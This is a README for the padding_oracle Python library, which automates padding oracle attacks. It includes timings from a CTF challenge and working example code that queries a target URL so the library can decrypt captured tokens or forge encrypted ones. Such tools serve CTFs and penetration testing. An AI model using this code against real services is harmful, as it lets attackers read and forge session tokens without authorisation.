# Padding Oracle Automation in Python

![Python Package Badge](https://github.com/djosix/padding_oracle.py/actions/workflows/python-package.yml/badge.svg)

This script automates padding oracle attacks in Python, offering efficient and threaded execution.

## Installation

You can install the script using one of these methods:

- **Via PyPI:**
  ```shell
  pip3 install -U padding_oracle
  ```

- **Directly from GitHub:**
  ```shell
  pip3 install -U git+https://github.com/djosix/padding_oracle.py.git
  ```

## Performance

The script's performance varies depending on the number of request threads. This was tested in a CTF web challenge:

| Request Threads | Time Taken  |
|-----------------|-------------|
| 1               | 17m 43s     |
| 4               | 5m 23s      |
| 16              | 1m 20s      |
| 64              | 56s         |

## Usage

### Decryption

When trying to decrypt a token like the one at `https://example.com/api/?token=M9I2K9mZxzRUvyMkFRebeQzrCaMta83eAE72lMxzg94%3D`, this script assumes that the token is vulnerable to a padding oracle attack.

```python
from padding_oracle import decrypt, base64_encode, base64_decode
import requests

sess = requests.Session()  # Uses connection pooling
url = 'https://example.com/api/'

def oracle(ciphertext: bytes):
    response = sess.get(url, params={'token': base64_encode(ciphertext)})
    if 'failed' in response.text:
        return False  # Token decryption failed
    elif 'success' in response.text:
        return True
    else:
        raise RuntimeError('Unexpected behavior')

ciphertext = base64_decode('M9I2K9mZxzRUvyMkFRebeQzrCaMta83eAE72lMxzg94=')
assert len(ciphertext) % 16 == 0

plaintext = decrypt(
    ciphertext,
    block_size=16,
    oracle=oracle,
    num_threads=16,
)
```

### Encryption

Below is an example demonstrating how to encrypt arbitrary bytes. For a detailed understanding of the process, please refer to [this Pull Request](https://github.com/djosix/padding_oracle.py/pull/4).

```python
from padding_oracle import encrypt

ciphertext = encrypt(
    b'YourTextHere', 
    block_size=16,
    oracle=oracle,
    num_threads=16,
)
```

### Customized Logging

Both `encrypt` and `decrypt` allow user to inject a custom logger:

- **Disable Logging:**
  ```python
  from padding_oracle import nop_logger

  plaintext = decrypt(
      ...
      logger=nop_logger,
  )
  ```

- **Selective Logging:**
  ```python
  def logger(kind: str, message: str):
      if kind in ('oracle_error', 'solve_block_error'):
          print(f'[{kind}] {message}')

  plaintext = decrypt(
      ...
      logger=logger,
  )
  ```

### Extras

The script also includes PHP-like encoding and decoding functions:

```python
from padding_oracle.encoding import urlencode, urldecode, base64_encode, base64_decode
```

### TODO

- [ ] Support more padding schemes

## License

This script is distributed under the MIT license.
